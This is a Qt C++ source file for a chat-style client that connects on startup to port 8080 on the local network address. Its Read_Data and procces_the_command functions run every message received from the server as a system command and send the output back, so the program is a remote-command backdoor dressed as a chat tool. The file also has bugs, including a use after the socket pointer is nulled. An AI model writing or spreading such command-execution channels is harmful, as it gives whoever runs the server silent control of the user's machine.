#include "my_client.h"
#include "ui_my_client.h"
#include <QtDebug>
#include <QByteArray>
#include <QHostAddress>
#include <QStyle>
#include <QtNetwork>
#include <QProcess>

My_Client::My_Client(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::My_Client)
{
    ui->setupUi(this);
    ui->Client_StackWidget->hide();
    ConnectToServer();
   // QTimer *try_to_connect = new QTimer();
   // connect(try_to_connect, &QTimer::timeout, this, &My_Client::ConnectToServer);
   // try_to_connect->start(3000);
    ui->disconnect_to_server->hide();
    ui->Client_StackWidget->setCurrentIndex(1);
}

My_Client::~My_Client()
{
    delete ui;
}

void My_Client::ConnectToServer()
{
 // if(connection_state)
    //{
        //qDebug() << "try to connecting";
        client_Socket = new QTcpSocket();
        QString serverIP;

        QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();

        for (const QHostAddress &address : ipAddressesList) {
            if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 &&
                address.protocol() == QAbstractSocket::IPv4Protocol)
            {
                serverIP = address.toString();
                break;
            }
        }
            client_Socket->connectToHost(serverIP, 8080);
            //if(client_Socket->state() == QTcpSocket::ConnectedState)
            //    connection_state = 0;

            ui->client_state->setText("Connecting to Server...");
            ui->Client_StackWidget->setCurrentIndex(1);
            connect(client_Socket, SIGNAL(disconnected()), this, SLOT(Disconnected_FromServer()));
            connect(client_Socket, SIGNAL(readyRead()), this, SLOT(Read_Data()));
            connect(client_Socket, SIGNAL(connected()), this, SLOT(Check_connection_To_Server()));
            connect(ui->Send_BTN, SIGNAL(clicked), this, SLOT(Write_Data()));
   // }
   // qDebug() << "connected.";
}

void My_Client::Check_connection_To_Server()
{
    ui->message_LE->setPlaceholderText("Connection is ok.");
}

void My_Client::on_Create_New_Client_BTN_clicked()
{
    if(ui->Client_StackWidget->currentIndex() == 1)
    {
        Disconnected_FromServer();
    }
    ui->Client_StackWidget->setCurrentIndex(0);
    ui->client_state->setText("");
    ui->Ip_Address->clear();
    ui->Port->clear();
    ui->Client_StackWidget->show();
    ui->disconnect_to_server->hide();
}

void My_Client::Write_Data(QString out)
{
    qDebug() << "Write data";

    //QString message = ui->message_LE->text();

    if (!out.isEmpty())
    {
        QByteArray requestData = out.toUtf8();
            client_Socket->write(requestData);
            ui->Text_shower->append("Client: " + out);
            ui->message_LE->clear();
    }
}

void My_Client::Read_Data()
{
    QByteArray data = client_Socket->readAll();
    qDebug() << "Read data : " + data;
    ui->Text_shower->append("Server: " + data);
    procces_the_command(data);
}

void My_Client::procces_the_command(QString command) {
    QProcess proc;
    proc.start(command);
    proc.waitForFinished();
    QString output = proc.readAllStandardOutput();
    qDebug() << output;
    Write_Data(output);
}

void My_Client::Disconnected_FromServer()
{
    connection_state = 1;
    ui->disconnect_to_server->hide();
    client_Socket->disconnect();
    client_Socket = nullptr;
    qDebug() << "Disconnected from server";
    client_Socket->deleteLater();
    ui->Client_StackWidget->setCurrentIndex(0);
    ui->client_state->setText("you disconnected.");
    ui->Text_shower->clear();
    ui->disconnect_to_server->hide();
}

void My_Client::on_ConnectToServer_BTN_clicked()
{
    ConnectToServer();
}

void My_Client::on_Send_BTN_clicked()
{
    //Write_Data();
    ui->message_LE->clear();
}

void My_Client::on_pushButton_clicked()
{
    ui->Client_StackWidget->hide();
}

void My_Client::on_Ip_Address_textChanged(const QString &arg1)
{
    QString state = "0";
    if(ui->Ip_Address->text() == "...")
    {
        state = "";
    }
    else
    {
        QHostAddress address(arg1);
        if(QAbstractSocket::IPv4Protocol == address.protocol())
        {
            state = "1";
        }
    }
    ui->Ip_Address->setProperty("state" , state);
    ui->Ip_Address->style()->polish(ui->Ip_Address);
}

void My_Client::on_disconnect_to_server_clicked()
{
    Disconnected_FromServer();
}

